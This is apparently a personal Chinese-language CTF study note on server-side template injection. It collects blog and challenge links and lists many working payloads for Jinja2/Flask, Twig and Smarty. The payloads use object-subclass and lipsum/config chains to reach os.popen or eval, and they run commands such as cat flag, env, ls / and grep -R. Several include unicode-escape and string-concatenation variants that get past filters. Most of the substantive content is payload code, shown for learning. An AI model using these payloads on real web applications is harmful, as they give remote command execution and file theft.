SSTI

[TOC]

![img](https://img-blog.csdnimg.cn/a871c4160af248e5a3f09e015f02690e.webp)

###### 写一些payload语句

[关于SSTI注入的一些理解_sst注入-CSDN博客](https://blog.csdn.net/weixin_44477223/article/details/115673318)

[SSTI详解 一文了解SSTI和所有常见payload 以flask模板为例_一文ssti-CSDN博客](https://blog.csdn.net/weixin_44604541/article/details/109048578?ops_request_misc=%7B%22request%5Fid%22%3A%22170875360116800192248427%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&request_id=170875360116800192248427&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-15-109048578-null-null.142^v99^pc_search_result_base1&utm_term=SSTI {%&spm=1018.2226.3001.4187)

https://blog.csdn.net/LYJ20010728/article/details/120205725?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169871461916800222850013%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169871461916800222850013&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120205725-null-null.142^v96^pc_search_result_base3&utm_term=ssti%20fuzz&spm=1018.2226.3001.4187

![1708753760870](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1708753760870.png)

site._Printer,warning,可能有OS模块。

```

{{lipsum.__globals__.get("os").popen("tac f*").read()}}
```

```
?name={{7*‘7’}} 检测出存在 SSTI 无过滤

?name={{config.class.init.globals[‘os’].popen(‘ls’).read() }} 发现flag

?name={{config.class.init.globals[‘os’].popen(‘cat flag’).read() }}
```

```
{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}
```

```
{%print(lipsum.__globals__.os.popen('env').read())%}
```

```
{{lipsum.__globals__['o''s']['pop''en']("cat /Th1s_is__F1114g").read()}}
```

[SSTI之细说jinja2的常用构造及利用思路_json ssti-CSDN博客](https://blog.csdn.net/qq_38154820/article/details/129861556?ops_request_misc=%7B%22request%5Fid%22%3A%22170660228816777224412884%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=170660228816777224412884&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-129861556-null-null.142^v99^pc_search_result_base1&utm_term=SSTI jinjia2&spm=1018.2226.3001.4187)

###### 基础学习一下

[SSTI学习记录_ssti code=(% set %)-CSDN博客](https://blog.csdn.net/cjdgg/article/details/115770395?spm=1001.2014.3001.5501)

[Python模板注入(SSTI)深入学习 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/6885)

一开始是通过class通过 base 拿到object基类，接着利用 subclasses() 获取对应子类。在全部子类中找到被重载的类即为可用的类，然后通过__init__去获取__globals__全局变量，接着通过__builtins__获取eval函数，最后利用popen命令执行、read()读取即可。


```
__base__ //对象的一个基类，一般情况下是object，有时不是，这时需要使用下一个方法

__mro__ //同样可以获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，object在最底层故在列表中的最后，通过__mro__[-1]可以获取到

__base__    //类型对象的直接基类

__bases__   //类型对象的全部基类，以元组形式，类型的实例通常没有属__bases__

__subclasses__() //继承此对象的子类，返回一个列表

__globals__ //返回一个由当前函数可以访问到的变量，方法，模块组成的字典，不包含该函数内声明的局部变量。

__getattribute__()实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。

__builtins__   //返回一个由内建函数函数名组成的列表。

__getitem__(index)  //返回索引为index的值。

url_for  //可以直接和__globals__配合，如：url_for.__globals__['__builtins__']，或者和string等配合，详情看迭代器部分

lipsum  //flask的一个方法,可以直接和__globals__配合，如：lipsum.__globals__['__builtins__']，或者和string等配合，详情看迭代器部分

__init__   //该方法用于将对象实例化，如x.__init__.__globals__['__builtins__']
//{{''.__class__.__mro__[-1].__subclasses__()["type"].__init__.__globals__}}像这种找到了类要查看该类的方法要先__init__再用__globals__，直接用__globals__会报错

config  //查看配置文件

app

__doc__

get_flashed_messages // flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。

__dic__     // 类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里

current_app          应用上下文，一个全局变量。

__import__     //动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]

```

###### twig

[buuctf-[BJDCTF2020\]Cookie is so stable(小宇特详解)_buuctf cookie is so stable-CSDN博客](https://blog.csdn.net/xhy18634297976/article/details/123011238?ops_request_misc=%7B%22request%5Fid%22%3A%22170253409716800222828223%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=170253409716800222828223&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-123011238-null-null.142^v96^pc_search_result_base1&utm_term=twig ctf&spm=1018.2226.3001.4187)

有专属payload:

```
1:{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}//查看id
2:{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}//查看flag

```

精华

https://www.cnblogs.com/hackxf/p/10480071.html

###### tornado模板注入

按理说这个很少考，

先贴一个大佬文章

[tornado模板注入-CSDN博客](https://blog.csdn.net/miuzzx/article/details/123329244)

一道题：[[NSSCTF 2nd\]MyHurricane | NSSCTF](https://www.nssctf.cn/problem/4283)

没看懂。

[SSTI模板注入_ssti注入-CSDN博客](https://blog.csdn.net/huangyongkang666/article/details/123628875?ops_request_misc=&request_id=&biz_id=102&utm_term=ssti注入&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-123628875.nonecase&spm=1018.2226.3001.4187)

[tornado模板注入-CSDN博客](https://blog.csdn.net/miuzzx/article/details/123329244)



###### jinjia2

[[安洵杯 2020\]Normal SSTI | NSSCTF](https://www.nssctf.cn/problem/910)

[[安洵杯 2020\]Normal SSTI详细解法（Unicode编码绕过）-CSDN博客](https://blog.csdn.net/2301_76690905/article/details/134273990?spm=1001.2014.3001.5501)

需要注意一下几点：1，要unicode编码，但不是全部都要；2，‘’|attr(“__class__”)等效于‘’.__class__；3，使用flask里的lipsum方法来执行命令：flask里的lipsum方法,可以用于得到__builtins__，而且lipsum.__globals__含有os模块；4，如果要使用xxx.os(‘xxx’)类似的方法，可以使用xxx|attr(“os”)(‘xxx’)

```
url={%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22)|attr(%22\u0067\u0065\u0074%22)(%22os%22)|attr(%22\u0070\u006f\u0070\u0065\u006e%22)(%22\u006c\u0073\u0020\u002f%22)|attr(%22\u0072\u0065\u0061\u0064%22)())%}（等效于{{lipsum.__globals__.get("os").popen("ls").read()}}，

```

read()注意()在attr()外面）

###### {%%}

https://blog.csdn.net/Alexhcf/article/details/108400293

```
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__=='catch_warnings' %}
{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}
{% endif %}{% endfor %}

这段代码看起来像是某种模板引擎（例如Jinja2，经常在Flask web框架中使用）中的代码。它试图执行一些危险的操作，具体解释如下：

[].__class__.__base__.__subclasses__()：这行代码的目的是获取Python中所有类的子类列表。[] 是一个空列表，.__class__ 获取其类（即 list），.__base__ 获取其父类（即 object），然后 .__subclasses__() 获取所有子类。

{% for c in [].__class__.__base__.__subclasses__() %}：这是一个模板循环，遍历上面提到的所有子类。

{% if c.__name__=='catch_warnings' %}：这个条件判断检查当前遍历到的类 c 的名称是否为 'catch_warnings'。

{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}：如果条件满足（即找到了名为 'catch_warnings' 的类），则执行这行代码。这行代码的目的是：

c.__init__.__globals__：获取 catch_warnings 类的 __init__ 方法的全局变量字典。
['__builtins__']：从全局变量字典中获取 __builtins__ 模块。__builtins__ 模块包含了许多内置函数和异常。
.open('app.py','r')：使用 __builtins__ 中的 open 函数以只读模式打开名为 'app.py' 的文件。
.read()：读取该文件的内容。
总的来说，这段代码的目的是在一个模板中尝试读取名为 'app.py' 的文件的内容，但它通过一种非常隐蔽和危险的方式来做这件事。这种代码通常被认为是恶意代码，因为它试图执行未授权的文件读取操作，并且它使用了不常见且易于被忽视的方法来隐藏其真实意图。如果你在你的项目中发现了这样的代码，建议立即删除并进行安全审查。




{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %}

//拼接绕过

{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}{% endif %}{% endfor %}



```

```
搜索目录下带有flag字符串的文件名：

{{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('**find / -name *flag***').read()")}}
1
输出结果没什么用，所以我们转而搜索根目录下带有flag内容的文件：

{{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('grep -R flag /').read()")}}
1
等待时间可能比较长，最后得到flag。

```

#### smarty

```
{if system('ls /')}{/if}
```

